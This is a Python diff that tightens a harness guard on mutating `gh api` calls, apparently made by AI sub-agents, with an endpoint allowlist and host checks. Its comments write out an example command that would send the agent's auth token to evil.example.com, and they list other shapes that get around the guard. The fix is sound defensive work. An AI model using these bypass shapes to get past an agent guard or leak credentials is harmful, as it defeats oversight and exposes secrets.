@@ -3528,9 +3528,10 @@ def _gh_api_command_segments(command: str) -> list[tuple[list[str], int, int]]:
     return segments
 
 
-def _segment_has_mutating_method_flag(tokens: list[str], start: int, end: int) -> bool:
-    """Return True if the `-X`/`--method` flag inside tokens[start:end] names
-    a mutating HTTP verb (POST/PATCH/PUT/DELETE).
+def _segment_mutating_method(tokens: list[str], start: int, end: int) -> Optional[str]:
+    """Return the mutating HTTP verb (POST/PATCH/PUT/DELETE) named by the
+    `-X`/`--method` flag inside tokens[start:end], or None if no mutating
+    verb is present.
 
     Matches both the space-separated form (`-X PATCH`, `--method PATCH`) and
     the `=`-joined long form (`--method=PATCH`) — the same coverage the
@@ -3542,21 +3543,119 @@ def _segment_has_mutating_method_flag(tokens: list[str], start: int, end: int) -
         tok = tokens[i]
         if tok in ("-X", "--method"):
             if i + 1 < end and tokens[i + 1].upper() in _MUTATING_HTTP_METHODS:
-                return True
+                return tokens[i + 1].upper()
         elif tok.startswith("--method="):
-            if tok[len("--method="):].upper() in _MUTATING_HTTP_METHODS:
-                return True
+            method = tok[len("--method=") :].upper()
+            if method in _MUTATING_HTTP_METHODS:
+                return method
         i += 1
-    return False
+    return None
+
+
+# ---------------------------------------------------------------------------
+# gh api mutation endpoint allowlist (D#1942)
+# ---------------------------------------------------------------------------
+# _gh_api_mutation_method_in_command_position used to block on ANY mutating
+# HTTP verb regardless of endpoint — which also blocked the PR-body update
+# executors are instructed to perform (`gh api -X PATCH .../pulls/{n} -f
+# body=...`). Deliberately an ALLOWLIST, not a denylist of dangerous
+# endpoints, following the _GIT_BRANCH_READONLY_FLAGS / D#2058 precedent
+# earlier in this file: an unrecognised (method, endpoint) pair must fail
+# closed. Seeded with exactly the two endpoints the defect names; branch
+# protection, collaborators, secrets, and every other administrative
+# endpoint stay blocked because they are not listed here. Module-level so a
+# test can monkeypatch it to prove the guard is load-bearing rather than
+# vacuous (see the positive-control test).
+_GH_API_MUTATION_ENDPOINT_ALLOWLIST: tuple[tuple[str, re.Pattern], ...] = (
+    ("PATCH", re.compile(r"^pulls/\d+$")),
+    ("PATCH", re.compile(r"^issues/\d+$")),
+)
+
+# Extracts an endpoint candidate from a single gh-api token: strips a
+# leading slash, then requires a `repos/{owner}/{repo}/` prefix, capturing
+# everything after it. Anchored at the START of the token, so a token like
+# `body=see repos/o/r/actions/secrets/X` — which does not START with
+# `repos/` — is never mistaken for the real endpoint operand. This is what
+# keeps endpoint-shaped text inside a field value from being treated as the
+# actual target.
+#
+# Absolute-URL forms are matched ONLY for the EXACT literal prefix
+# `https://api.github.com/` — a code-review fix. The first version of this
+# regex accepted `https?://[^/]+/` for ANY host, so
+# `gh api -X PATCH https://evil.example.com/repos/o/r/pulls/1 -f body=x`
+# matched the allowlist and was ALLOWED: `gh api` genuinely dispatches to
+# whatever host an absolute URL names, carrying the sub-agent's auth token
+# with it. The allowlist's whole premise is "this endpoint on OUR API", and
+# an unverified host makes that premise meaningless, so an absolute URL is
+# refused outright unless the host is exactly `api.github.com` over `https`.
+# A literal prefix (rather than a capturing host group that gets compared
+# afterwards) is what closes the related bypass shapes structurally, not
+# just the plain-host one: a token that does not match this literal prefix
+# is not "a candidate with a bad host" needing a separate check — it is
+# simply NOT a candidate at all, which (absent some other candidate in the
+# same invocation) fails the whole call CLOSED via the zero-candidates path
+# below, not open. That is what also catches, with no extra logic:
+#   - a userinfo host (`https://api.github.com@evil.example.com/...`) —
+#     the literal `api.github.com/` is followed by `@`, not `/`, so it
+#     never matches;
+#   - a scheme-relative URL (`//evil.example.com/...`) — there is no
+#     `https://` at all, so the token doesn't start with the required
+#     literal, and it doesn't start with `repos/` either;
+#   - an uppercase scheme (`HTTPS://...`) — matched case-sensitively, so it
+#     falls through the same way.
+# Deliberately does not accept `http://`: gh api only ever talks to
+# api.github.com over https.
+_GH_API_ENDPOINT_CANDIDATE_RE = re.compile(
+    r"^(?:https://api\.github\.com/)?/?repos/[^/]+/[^/]+/(.+)$"
+)
+
+
+def _gh_api_endpoint_candidates(tokens: list[str], start: int, end: int) -> list[str]:
+    """Return every token in tokens[start:end] that looks like a gh api
+    endpoint operand. Does not assume the endpoint's position — `gh api`
+    accepts the endpoint after flags (`-X PATCH -f body=x repos/o/r/pulls/1`
+    is valid), so every token in the invocation is scanned rather than just
+    the one immediately after `api`.
+    """
+    candidates: list[str] = []
+    for i in range(start, end):
+        m = _GH_API_ENDPOINT_CANDIDATE_RE.match(tokens[i])
+        if m:
+            candidates.append(m.group(1))
+    return candidates
+
+
+def _gh_api_mutation_endpoint_allowed(method: str, endpoint_candidates: list[str]) -> bool:
+    """Return True only if EVERY endpoint candidate found in the invocation
+    is allowlisted for *method*. Fails closed when there are zero
+    candidates: `all()` over an empty list is True, so the no-endpoint-token
+    case is handled explicitly here rather than falling through to that
+    vacuous truth.
+    """
+    if not endpoint_candidates:
+        return False
+    return all(
+        any(
+            method == allowed_method and pattern.match(candidate)
+            for allowed_method, pattern in _GH_API_MUTATION_ENDPOINT_ALLOWLIST
+        )
+        for candidate in endpoint_candidates
+    )
 
 
 def _gh_api_mutation_method_in_command_position(command: str) -> bool:
     """Return True if a REAL `gh api` invocation (at a command position, not
     merely mentioned as text — see `_find_real_command_segments` for the full
-    list of shapes covered) uses -X/--method with a mutating HTTP verb.
+    list of shapes covered) uses -X/--method with a mutating HTTP verb AND
+    the endpoint(s) it targets are not on the (method, endpoint) allowlist
+    above (D#1942). An unrecognised endpoint fails closed.
     """
     for tokens, start, end in _gh_api_command_segments(command):
-        if _segment_has_mutating_method_flag(tokens, start, end):
+        method = _segment_mutating_method(tokens, start, end)
+        if method is None:
+            continue
+        candidates = _gh_api_endpoint_candidates(tokens, start, end)
+        if not _gh_api_mutation_endpoint_allowed(method, candidates):
             return True
     return False
 
